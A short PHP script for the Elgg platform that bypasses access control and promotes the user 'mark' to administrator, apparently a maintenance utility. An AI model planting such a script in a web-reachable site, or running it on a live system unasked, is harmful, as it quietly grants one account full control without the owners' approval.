<?php

require(dirname(dirname(__FILE__)) . '/engine/start.php');

elgg_set_ignore_access(true);

//reset_login_failure_count($john->guid);
$user = new ElggUser('mark');
$user->makeAdmin();


